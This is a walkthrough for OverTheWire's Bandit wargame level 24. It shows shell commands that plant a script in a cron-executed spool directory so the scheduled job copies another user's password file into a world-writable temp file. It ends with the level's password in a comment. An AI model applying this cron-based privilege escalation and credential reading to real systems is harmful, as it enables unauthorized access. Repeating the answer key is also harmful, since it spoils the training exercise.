## Level Goal

[URL](https://overthewire.org/wargames/bandit/bandit24.html).
A program is running automatically at regular intervals from cron, the time-based job scheduler.
Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!
NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy aroundâ€¦

```shell
ssh -p 2220 bandit23@bandit.labs.overthewire.org
cat /etc/cron.d/cronjob_bandit24
cat /usr/bin/cronjob_bandit24.sh
mktemp -d # create a temp directory to create a shell file
cd /tmp/tmp.iWS0YkMqeM/
# give every user permission to read/write to this directory and the files
touch b24.sh pass.txt
chmod 777 b24.sh
chmod 777 pass.txt
chmod 777 /tmp/tmp.iWS0YkMqeM/
# add command to copy bandit24 password to the pass.txt 
cat <<EOF > b24.sh
> #!/bin/bash
>
> cat /etc/bandit_pass/bandit24 > /tmp/tmp.iWS0YkMqeM/pass.txt
> EOF
cp b24.sh /var/spool/bandit24/foo
tail -f pass.txt
```

The password for the next level is: <!-- gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 -->
